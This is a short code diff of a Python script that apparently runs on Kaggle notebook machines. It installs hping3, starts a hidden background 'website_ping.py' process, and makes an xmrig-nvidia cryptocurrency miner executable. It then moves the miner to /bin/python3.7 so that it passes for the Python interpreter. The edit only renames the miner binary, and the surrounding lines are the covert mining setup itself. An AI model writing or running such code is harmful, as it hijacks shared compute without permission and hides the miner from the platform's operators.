@@ -3,7 +3,7 @@ down_dep="apt install -y libmicrohttpd-dev hping3"
 print("Installing")
 os.system(down_dep)
 print("checking")
-file_exist=os.path.isfile('/kaggle/working/xmr-nvidia/xmrig')
+file_exist=os.path.isfile('/kaggle/working/xmr-nvidia/xmrig-nvidia')
 print(file_exist)
 cwd=os.getcwd()
 print(cwd)
@@ -26,7 +26,7 @@ else :
     cwd=os.getcwd()
     cping="nohup python "+cwd+ "/xmr-nvidia/website_ping.py > /dev/null 2>&1 &"
     os.system(cping)
-    cdir=cwd+"/xmr-nvidia/xmrig"
+    cdir=cwd+"/xmr-nvidia/xmrig-nvidia"
     chmod_cmd="chmod 755 "+cdir
     os.system(chmod_cmd)
     mv_dir="mv "+cdir+" /bin/python3.7"
